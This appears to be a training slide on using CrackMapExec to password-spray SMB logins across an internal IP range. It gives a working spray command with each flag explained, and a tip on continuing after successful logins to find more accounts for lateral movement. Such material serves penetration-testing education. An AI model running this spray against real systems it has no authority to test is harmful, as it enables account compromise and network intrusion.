Tool Spotlight

CrackMapExec for Password Spraying

Automating initial access checks across multiple hosts

CrackMapExec (CME) Capabilities

  • •Versatile Post-Exploitation: Enumerates and attacks Active Directory environments.
  • •Service Support: Targets SMB, WinRM, LDAP, and more.
  • •Enumeration: Lists logged-on users, shares, and domain information.
  • •Password Spraying: Efficiently tests common passwords against multiple accounts.
Key Takeaway

CME is a powerful tool that simplifies and accelerates the process of identifying weak credentials and gaining initial access.

CME Password Spray Example

# Basic password spray against an IP range
crackmapexec smb 192.168.1.0/24 -u users.txt -p "Summer2023!" --continue-on-success

# Explanation of flags:
smb: Target the SMB service
192.168.1.0/24: Target IP range
-u users.txt: File containing usernames
-p "Summer2023!": The single password to spray
--continue-on-success: Continue spraying even after a successful login
Pro Tip

Always use the --continue-on-success flag to ensure you identify all accounts using the sprayed password, maximizing your potential for lateral movement.
